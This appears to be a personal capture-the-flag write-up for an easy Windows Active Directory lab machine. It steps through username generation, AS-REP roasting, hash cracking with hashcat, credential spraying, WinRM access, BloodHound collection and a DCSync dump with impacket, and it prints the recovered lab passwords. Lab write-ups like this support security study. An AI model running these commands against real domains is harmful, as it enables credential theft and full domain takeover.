---
Status: Done
OS: Windows AD
Difficulty: Easy
tags:
  - username
Date: 2026-06-26T16:08:00
Owned: 2026-07-01T16:34:00
---

---
# Enumeration
## port scan
naabu scan  
```sh
naabu -host 10.129.95.180 -p - | nerva -o allport.txt
```
![[Pasted image 20260626162719.png]]

port 80  
![[Pasted image 20260626161036.png]]
we can see team members on the site  
![[Pasted image 20260626161207.png]]
create a users.txt  
![[Pasted image 20260627152029.png]]



## SMB
anonymous and guest failed  
![[Pasted image 20260626163813.png]]

## dir enum

feroxbuster  
nothing interesting  
![[Pasted image 20260626162638.png]]

# Exploit

edit the users list  
![[Pasted image 20260627152123.png]]
from the user found let's do blind asreproast (only user no password)  
```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
```
no user found  
![[Pasted image 20260627152529.png]]
getting some more variation  
```sh
sed -E 's/^(.)([^ ]*) (.)(.*)/\U\1\L\2\U\3/' users.txt
```
![[Pasted image 20260627154122.png]]
capitalize first letter and get first letter of lastname  
![[Pasted image 20260627154234.png]]
no hit D:  
viewing hint we need more variant of username we have script for that https://github.com/urbanadventurer/username-anarchy  
to install  
```sh
git clone https://github.com/urbanadventurer/username-anarchy /opt/username-anarchy

alias username-anarchy='/opt/username-anarchy/username-anarchy' >> ~/.zshrc
```
I can generate variant of name from our user list, but I have problem getting output in uppercase.  
to list format available  
```sh
username-anarchy -l
```
let's try some format  
```sh
username-anarchy -i users.txt -f flast,f.last,first.last,last.f
```
![[Pasted image 20260701011430.png]]
now, let's try kerberoast again  
```sh
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile usersvr.txt -format hashcat -outputfile asrep.hashes
```
this time we hit one username  
![[Pasted image 20260701011925.png]]
crack the password with hashcat  
```sh
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260701012112.png]]
save `fsmith:Thestrokes23` to creds.txt  

I'm going to use nxc wrapper to spray found creds on service  
https://github.com/NTHSec/nxcspray

```sh
nxcspray all 10.129.95.180 -u fsmith -p Thestrokes23
```
this wrapper do not cover all service available on netexec, but should cover enough for OSCP  
![[Pasted image 20260701022105.png]]
smb shares  
![[Pasted image 20260701022654.png]]
Pwned on winrm let's try to connect using evil-winrm  
```sh
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```
connected  
![[Pasted image 20260701022322.png]]
got the user flag  
![[Pasted image 20260701022408.png]]

# Privilege-Escalation

there is other users on the host which we cannot access the files  
![[Pasted image 20260701022532.png]]

checked the history path  
![[Pasted image 20260701023349.png]]
there is no file there  

do user enumeration  
```sh
net user
```
![[Pasted image 20260701024836.png]]
interesting account : HSmith, svc_loanmgr  
HSmith can be auth with the same credential but nothing interesting pop up  
![[Pasted image 20260701135418.png]]

At this point I'm gonna just run winPEAS and see what we got  
```powershell
upload winPEASany.exe

./winPEASany.exe > winPeasResult.txt

download winPeasResult.txt
```
![[Pasted image 20260701135955.png]]
let's see interesting bit from result  
There is cached creds  --> normal i guess  
![[Pasted image 20260701141027.png]]
AutoLogon Cred  
![[Pasted image 20260701140305.png]]
Moneymakestheworldgoround!  
![[Pasted image 20260701140433.png]]
can get tgs?  
```sh
impacket-GetUserSPNs -request -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/hsmith:Thestrokes23
```
![[Pasted image 20260701142107.png]]
facing this issue, I stumbled upon this post https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

to fix the issue we just need to sync the clock using this command  
```sh
sudo timedatectl set-ntp off
sudo rdate -n 10.129.95.180
```
now do kerberoast again  
![[Pasted image 20260701142255.png]]
success! but for what  
there is only SPN for hsmith himself  
![[Pasted image 20260701142854.png]]
if we crack the hash we will get the same password...  
next time we should look for other service account ex. mssql  

turn out I missed the svc_loanmanager account I have checked the cred with user svc_loanmanager  
but haven't check the actual name of the account which is svc_loanmgr  the svc_loanmanager is indeed default username  
![[Pasted image 20260701144343.png]]
checking the cred with nxcspray again  
![[Pasted image 20260701144719.png]]

at this point where we have lots of creds and been cheking this and that  
we can save time if we ran `net user /domain` and then checking group of each users we got  
we will see that they are in the same group, which means we could skip lots of checking  

## Bloodhound
start bloodhound  
```sh
cd ~/Bloodhound
docker-compose up -d
```
![[Pasted image 20260701155904.png]]
download the collectors then upload it to our target via evil-winrm  
```sh
upload SharpHound.exe
```
![[Pasted image 20260701160116.png]]
run the collectors  
```sh
.\SharpHound.exe -c All --zipfilename EGOTISTICAL
```
done running  
![[Pasted image 20260701160142.png]]
get the file the upload to our bloodhound  
![[Pasted image 20260701160939.png]]
selecting svc_loanmgr as the node check the outbounds we can see the the account has DCsync permission  
## DCSync
let's perform DCSync using impacket  
```sh
impacket-secretsdump -just-dc EGOTISTICAL.LOCAL/svc_loanmgr:"Moneymakestheworldgoround\!"@10.129.95.180
```
success, how ever from here I put in the wrong domain but impacket is smart or at least I put in the correct IP target and the process get the correct domain in the end.  
![[Pasted image 20260701161112.png]]
from the NTDS.DIT we got hash of local Admin  
![[Pasted image 20260701161221.png]]
which we can then use to connect via winrm  
![[Pasted image 20260701161307.png]]
done, got the root.txt flag  

# Lesson Learned
Got creds with Default username, Default password.  
Also need to check if the username has been changed.  

Enum thoroughly!
